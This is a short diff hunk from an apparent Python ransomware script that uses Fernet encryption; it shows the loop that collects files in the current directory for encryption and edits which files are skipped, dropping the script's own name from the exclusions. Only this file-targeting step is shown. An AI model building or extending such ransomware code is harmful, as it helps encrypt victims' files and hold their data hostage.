@@ -4,7 +4,7 @@ from cryptography.fernet import Fernet
 file_list = []
 
 for file in os.listdir():
-	if file == 'ransomware.py' or file == 'ransomdecrypter.py' or file == 'desktop.ini':
+	if  file == 'ransomdecrypter.py' or file == 'desktop.ini':
 		continue
 	if os.path.isfile(file):
 		file_list.append(file)
